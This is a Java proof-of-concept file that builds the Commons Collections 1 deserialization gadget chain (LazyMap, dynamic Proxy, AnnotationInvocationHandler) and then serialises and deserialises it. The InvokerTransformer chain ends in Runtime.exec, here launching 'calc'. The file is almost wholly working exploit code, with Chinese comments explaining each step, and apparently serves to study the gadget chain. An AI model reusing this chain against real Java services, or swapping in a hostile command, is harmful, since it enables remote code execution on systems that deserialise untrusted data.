package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/*
*AnnotationInvocationHandler.readObject()
* ->Map(Proxy).entrySet()
*  ->AnnotationHandler.Invoke()
*   ->LazyMap.get()
*    ->ChainedTransformer.transform()
*     ->InvokerTransformer.transform()
* */
public class CC1_LazyMap {
    public static void main(String[] args) throws Exception {
        // 第一层
        Transformer[] tfs = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}),
                new ConstantTransformer(1)
        };
        Transformer transformerChain = new ChainedTransformer(tfs);
        Map<Object, Object> map = new HashMap<>();
        map.put("value", "3xsh0re");
        Map<Object,Object> lazyMap = LazyMap.decorate(map,transformerChain);
//        获取类
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
//        对Map创建代理,使用AnnotationInvocationHandler进行代理
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
//        对proxyMap进行再封装,因为我们需要的是AnnotationInvocationHandler的readObject
        handler = (InvocationHandler) constructor.newInstance(Target.class,proxyMap);

//        测试
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
}
